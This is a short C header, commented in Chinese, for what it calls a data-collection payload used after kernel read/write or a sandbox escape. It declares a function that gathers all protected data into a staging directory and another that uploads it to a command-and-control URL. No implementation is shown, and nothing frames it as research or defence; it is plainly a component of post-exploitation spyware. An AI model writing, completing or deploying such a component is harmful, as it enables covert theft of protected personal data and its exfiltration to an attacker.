//
//  collector.h — 内核 r/w 后数据采集载荷
//
#pragma once
#include <stdbool.h>

// 采集所有受保护数据到本地目录
// 需要先获得内核 r/w 或沙箱逃逸
int collector_run(const char *staging_dir);
bool c2_upload(const char *staging_dir, const char *c2_url);
